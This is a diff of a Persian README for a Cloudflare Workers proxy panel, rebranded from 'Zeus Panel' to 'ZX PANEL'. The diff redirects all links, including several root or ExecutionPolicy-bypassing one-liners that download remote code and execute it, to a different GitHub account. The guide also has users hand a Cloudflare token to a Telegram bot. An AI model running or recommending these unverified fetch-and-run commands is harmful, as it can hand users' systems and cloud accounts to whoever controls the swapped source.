@@ -6,27 +6,27 @@
 <div align="center">
  
 # ⚡ پنل زئوس
-[![Version](https://img.shields.io/badge/Version-v2.2.2-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/zeus-panel/ZEUS-PANEL)
+[![Version](https://img.shields.io/badge/Version-v2.2.2-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/AMINOPY/zxpan)
 [![Platform](https://img.shields.io/badge/Platform-Cloudflare%20Workers-f38020.svg?style=for-the-badge&logo=cloudflare&logoColor=white)](https://workers.cloudflare.com/)
-[![License](https://img.shields.io/badge/License-Proprietary%20(Non--Commercial)-red.svg?style=for-the-badge)](https://github.com/zeus-panel/ZEUS-PANEL/blob/main/LICENSE)
+[![License](https://img.shields.io/badge/License-Proprietary%20(Non--Commercial)-red.svg?style=for-the-badge)](https://github.com/AMINOPY/zxpan/blob/main/LICENSE)
 [![Telegram](https://img.shields.io/badge/Community-PANEL__ZEUS-2CA5E0.svg?style=for-the-badge&logo=telegram)](https://t.me/PANEL_ZEUS)
 </div>
 
 <table width="100%">
 <tr>
 <td width="50%" valign="middle" align="center">
-<img src="https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/photos/dark.png" width="100%" alt="Zeus Panel Dark Mode" style="border-radius: 12px;">
+<img src="https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/photos/dark.png" width="100%" alt="ZX PANEL Dark Mode" style="border-radius: 12px;">
 </td>
 <td width="50%" valign="middle" align="center">
-<img src="https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/photos/1.png" width="100%" alt="Zeus Panel Screenshot 1" style="border-radius: 12px;">
+<img src="https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/photos/1.png" width="100%" alt="ZX PANEL Screenshot 1" style="border-radius: 12px;">
 </td>
 </tr>
 <tr>
 <td width="50%" valign="middle" align="center">
-<img src="https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/photos/2.png" width="100%" alt="Zeus Panel Screenshot 2" style="border-radius: 12px;">
+<img src="https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/photos/2.png" width="100%" alt="ZX PANEL Screenshot 2" style="border-radius: 12px;">
 </td>
 <td width="50%" valign="middle" align="center">
-<img src="https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/photos/3.png" width="100%" alt="Zeus Panel Screenshot 3" style="border-radius: 12px;">
+<img src="https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/photos/3.png" width="100%" alt="ZX PANEL Screenshot 3" style="border-radius: 12px;">
 </td>
 </tr>
 </table>
@@ -34,10 +34,10 @@
 <table width="100%">
 <tr>
 <td width="50%" valign="middle" align="center">
-<img src="https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/photos/bot.png" width="100%" alt="Zeus Panel Status" style="border-radius: 12px;">
+<img src="https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/photos/bot.png" width="100%" alt="ZX PANEL Status" style="border-radius: 12px;">
 </td>
 <td width="50%" valign="middle" align="center">
-<img src="https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/photos/status.png" width="100%" alt="Zeus Panel Dark Mode" style="border-radius: 12px;">
+<img src="https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/photos/status.png" width="100%" alt="ZX PANEL Dark Mode" style="border-radius: 12px;">
 </td>
 </tr>
 </table>
@@ -116,7 +116,7 @@
 <br>
 
 <a href="https://t.me/ZEUS_PANEL_BOT" target="_blank">
-<img src="https://img.shields.io/badge/Zeus_Telegram_Bot-Start_Bot-0088cc?style=for-the-badge&logo=telegram&logoColor=white" alt="Zeus Telegram Bot" height="40">
+<img src="https://img.shields.io/badge/Zeus_Telegram_Bot-Start_Bot-0088cc?style=for-the-badge&logo=telegram&logoColor=white" alt="ZX PANEL Telegram Bot" height="40">
 </a>
 
 </div>
@@ -125,7 +125,7 @@
 
 ## 🤖 دیپلوی از طریق ربات تلگرام
 
-1. 🌐 وارد **[ربات تلگرام زئوس](https://t.me/ZEUS_PANEL_BOT)** شوید و روی `Start` کلیک کنید.
+1. 🌐 وارد **[ربات تلگرام ZX PANEL](https://t.me/ZEUS_PANEL_BOT)** شوید و روی `Start` کلیک کنید.
 2. 👤 از منوی اصلی روی **"➕ Register Cloudflare Account"** کلیک کنید.
 3. 🔗 روی دکمه اینلاین **"🔑 Get Cloudflare Token"** کلیک کنید تا به اکانت کلودفلر خود هدایت شوید.
 4. 🟦 به پایین صفحه کلودفلر اسکرول کنید، روی دکمه آبی `Continue to summary` کلیک کنید و سپس `Create Token` را بزنید.
@@ -140,14 +140,14 @@
 ---
 
 
-# 🛡️ ساخت پروکسی SOCKS5 اختصاصی (Zeus Relay)
+# 🛡️ ساخت پروکسی SOCKS5 اختصاصی (ZX PANEL Relay)
 
 یک اسکریپت bash اختصاصی برای استقرار فوری یک پروکسی SOCKS5 خصوصی و امن روی هر VPS لینوکسی (اوبونتو، دبیان، سنت‌او‌اس، راکی لینوکس) ارائه شده است. این کار به‌شدت برای کاربرانی که می‌خواهند پروکسی‌های مسکونی VIP برای مسیریابی ترافیک از طریق آی‌پی‌های تمیز و اختصاصی بسازند، توصیه می‌شود.
 
 برای نصب، به‌روزرسانی یا حذف پروکسی Dante SOCKS5، دستور زیر را با دسترسی root روی سرور لینوکس خود اجرا کنید:
 
 ```bash
-bash <(curl -Ls https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/main/zeus-relay.sh | sed 's/\r$//')
+bash <(curl -Ls https://raw.githubusercontent.com/AMINOPY/zxpan/main/zeus-relay.sh | sed 's/\r$//')
 ```
 
 این اسکریپت دارای منوی تعاملی، پیکربندی خودکار پورت، تولید تصادفی و امن نام کاربری/رمز عبور و پشتیبانی بومی از IPv4/IPv6 است.
@@ -163,7 +163,7 @@ bash <(curl -Ls https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/main/zeus-r
 2. اپ را باز کنید، از منوی کناری به **Terminal** بروید و دستور زیر را اجرا کنید:
 
 ```bash
-python -c "import urllib.request; req = urllib.request.Request('https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/zeus-scanner.txt', headers={'User-Agent': 'Mozilla/5.0'}); exec(urllib.request.urlopen(req).read().decode('utf-8').split('---PYTH' + 'ON---')[1].split('---POWERSHELL---')[0].strip())"
+python -c "import urllib.request; req = urllib.request.Request('https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/zeus-scanner.txt', headers={'User-Agent': 'Mozilla/5.0'}); exec(urllib.request.urlopen(req).read().decode('utf-8').split('---PYTH' + 'ON---')[1].split('---POWERSHELL---')[0].strip())"
 
 ```
 
@@ -174,7 +174,7 @@ python -c "import urllib.request; req = urllib.request.Request('https://raw.gith
 **Command Prompt (CMD)** را در ویندوز باز کنید، دستور زیر را پیست کنید و Enter بزنید. رابط اسکنر پرسرعت به‌طور خودکار کامپایل و راه‌اندازی می‌شود:
 
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $wc = New-Object System.Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; $text = ($wc.DownloadString('https://raw.githubusercontent.com/panel-zeus/Z-E-U-S/refs/heads/main/zeus-scanner.txt') -split '---POWERSHELL---')[1].Trim(); [IO.File]::WriteAllText('zeus-scanner.ps1', $text, [System.Text.Encoding]::UTF8); .\zeus-scanner.ps1"
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $wc = New-Object System.Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; $text = ($wc.DownloadString('https://raw.githubusercontent.com/AMINOPY/zxpan/refs/heads/main/zeus-scanner.txt') -split '---POWERSHELL---')[1].Trim(); [IO.File]::WriteAllText('zeus-scanner.ps1', $text, [System.Text.Encoding]::UTF8); .\zeus-scanner.ps1"
 
 ```
 
@@ -195,9 +195,9 @@ powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::Security
 
 <a href="https://www.star-history.com/?repos=panel-zeus%2FZ-E-U-S&type=date&legend=bottom-right">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=panel-zeus/Z-E-U-S&type=date&theme=dark&legend=bottom-right&sealed_token=r3Lb_3aKfu0utexFy3xJoisRGRSGS4OCoQg3ZS5TM1QCTppem2RU8sLiVsD6UQ38Ah92MwuZU_PjyQTFM5yY3rAw14WEjtonC70muFBH4RbXxBDGIy5iIw" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=panel-zeus/Z-E-U-S&type=date&legend=bottom-right&sealed_token=r3Lb_3aKfu0utexFy3xJoisRGRSGS4OCoQg3ZS5TM1QCTppem2RU8sLiVsD6UQ38Ah92MwuZU_PjyQTFM5yY3rAw14WEjtonC70muFBH4RbXxBDGIy5iIw" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=panel-zeus/Z-E-U-S&type=date&legend=bottom-right&sealed_token=r3Lb_3aKfu0utexFy3xJoisRGRSGS4OCoQg3ZS5TM1QCTppem2RU8sLiVsD6UQ38Ah92MwuZU_PjyQTFM5yY3rAw14WEjtonC70muFBH4RbXxBDGIy5iIw" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=AMINOPY/zxpan&type=date&theme=dark&legend=bottom-right&sealed_token=r3Lb_3aKfu0utexFy3xJoisRGRSGS4OCoQg3ZS5TM1QCTppem2RU8sLiVsD6UQ38Ah92MwuZU_PjyQTFM5yY3rAw14WEjtonC70muFBH4RbXxBDGIy5iIw" />
+   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=AMINOPY/zxpan&type=date&legend=bottom-right&sealed_token=r3Lb_3aKfu0utexFy3xJoisRGRSGS4OCoQg3ZS5TM1QCTppem2RU8sLiVsD6UQ38Ah92MwuZU_PjyQTFM5yY3rAw14WEjtonC70muFBH4RbXxBDGIy5iIw" />
+   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=AMINOPY/zxpan&type=date&legend=bottom-right&sealed_token=r3Lb_3aKfu0utexFy3xJoisRGRSGS4OCoQg3ZS5TM1QCTppem2RU8sLiVsD6UQ38Ah92MwuZU_PjyQTFM5yY3rAw14WEjtonC70muFBH4RbXxBDGIy5iIw" />
  </picture>
 </a>
 
